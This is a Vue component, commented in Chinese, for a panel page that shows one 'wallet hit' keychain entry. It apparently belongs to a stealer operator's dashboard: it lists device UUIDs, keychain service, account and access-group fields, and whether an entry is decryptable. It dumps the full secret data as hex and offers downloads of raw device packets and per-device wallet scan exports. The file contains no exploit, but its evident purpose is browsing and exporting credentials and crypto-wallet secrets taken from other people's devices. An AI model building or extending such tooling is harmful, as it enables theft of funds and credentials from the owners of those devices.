<script setup lang="ts">
import { onMounted, ref } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import { panelApi } from '@/api/panel'
import type { KeychainItemRow } from '@/api/types'
import { Download, ArrowLeft, Refresh, Coin } from '@element-plus/icons-vue'
import EmptyState from '@/components/EmptyState.vue'
import { tsShort } from '@/utils/format'

/**
 * 钱包命中条目 —— 详细解析页（从 /keychain 列表点击行跳转）。
 * 展示完整解析字段 + blobSizes + dataHex 全文；顶部保留 war 包 / 钱包 JSON 下载。
 */
const route = useRoute()
const router = useRouter()
const cur = ref<KeychainItemRow | null>(null)
const loading = ref(false)

async function load() {
  loading.value = true
  try {
    cur.value = await panelApi.keychainItem(String(route.params.id ?? ''))
  } catch {
    cur.value = null
  } finally {
    loading.value = false
  }
}

function back() {
  void router.push('/keychain')
}

function pcLabel(pc?: string) {
  const n = Number(pc ?? 0)
  return n === 9 || n === 10 || n === 11 ? '可解密' : '加密'
}

onMounted(load)
</script>

<template>
  <div class="kd">
    <section class="app-card">
      <div class="app-card__head">
        <h3 class="app-card__title">
          <el-button size="small" text :icon="ArrowLeft" @click="back">返回列表</el-button>
        </h3>
        <div class="kd__actions">
          <el-button size="small" text :icon="Refresh" @click="load" />
          <a
            class="kd__btn"
            title="下载 war 原包"
            :href="cur?.packet_id ? `/panel/api/keychain/war_download?packet_id=${cur.packet_id}` : '#'"
            download
          >
            <el-icon><Download /></el-icon>war 包
          </a>
          <a
            class="kd__btn"
            title="下载钱包扫描 JSON"
            :href="cur?.device_uuid ? `/panel/api/keychain/wallet_export?uuid=${encodeURIComponent(String(cur.device_uuid))}` : '#'"
            download
          >
            <el-icon><Download /></el-icon>钱包 JSON
          </a>
        </div>
      </div>
    </section>

    <section v-if="cur" class="app-card">
      <div class="app-card__head">
        <h3 class="app-card__title">
          <el-icon><Coin /></el-icon>钱包解析
          <span class="chip chip--brand">{{ cur.wallet_rule || '-' }}</span>
          <span class="chip chip--mono mono">hits {{ cur.hits ?? 1 }}</span>
        </h3>
      </div>
      <div class="app-card__body">
        <div class="kv">
          <div><span>条目ID</span><b class="mono">{{ cur.id ?? '-' }}</b></div>
          <div><span>设备</span><b class="mono">{{ cur.device_uuid || '-' }}</b></div>
          <div><span>表</span><b class="mono">{{ cur.tbl || '-' }}</b></div>
          <div><span>钱包</span><b>{{ cur.wallet_rule || '-' }}</b></div>
          <div><span>service</span><b class="mono">{{ cur.service || '-' }}</b></div>
          <div><span>account</span><b class="mono">{{ cur.account || '-' }}</b></div>
          <div><span>accessGroup</span><b class="mono">{{ cur.access_group || '-' }}</b></div>
          <div><span>label</span><b class="mono">{{ cur.label || '-' }}</b></div>
          <div><span>rowid</span><b class="mono">{{ cur.rowid_orig ?? '-' }}</b></div>
          <div><span>protectionClass</span><b class="mono">{{ cur.protection_class ?? '-' }}</b></div>
          <div><span>version</span><b class="mono">{{ cur.version ?? '-' }}</b></div>
          <div><span>状态</span><b>{{ pcLabel(cur.protection_class) }}</b></div>
          <div><span>首见</span><b class="mono">{{ tsShort(cur.first_seen ?? '') }}</b></div>
          <div><span>复见</span><b class="mono">{{ tsShort(cur.last_seen ?? '') }}</b></div>
        </div>
        <div class="lbl">blobSizes</div>
        <pre class="pre">{{ cur.blob_sizes || '(空)' }}</pre>
        <div class="lbl">dataHex（完整，{{ cur.data_len ?? 0 }} 字节）</div>
        <pre class="pre kd__hex">{{ cur.data_hex || '(空)' }}</pre>
      </div>
    </section>
    <section v-else class="app-card">
      <div class="app-card__body">
        <EmptyState :text="loading ? '加载中…' : '条目不存在或已被清理'" />
      </div>
    </section>
  </div>
</template>

<style scoped>
.kd {
  display: flex;
  flex-direction: column;
  gap: var(--sp-4);
}
.kd__actions {
  display: flex;
  align-items: center;
  gap: 6px;
}
.kd__btn {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 4px 10px;
  border-radius: var(--r-sm);
  border: 1px solid var(--border);
  background: var(--bg-card-alt);
  color: var(--text-2);
  font-size: var(--fs-xs);
  text-decoration: none;
  transition: all var(--dur-fast) var(--ease);
}
.kd__btn:hover {
  border-color: var(--border-glow);
  color: var(--brand-2);
}
.kd__hex {
  max-height: 40vh;
  overflow: auto;
}
.kv > div {
  display: flex;
  justify-content: space-between;
  gap: var(--sp-3);
  padding: 6px 0;
  border-bottom: 1px dashed var(--border);
}
.kv span {
  color: var(--text-3);
  font-size: var(--fs-sm);
}
.kv b {
  font-weight: 600;
  text-align: right;
  word-break: break-all;
}
.lbl {
  margin: var(--sp-4) 0 var(--sp-2);
  color: var(--text-3);
  font-size: var(--fs-sm);
}
</style>
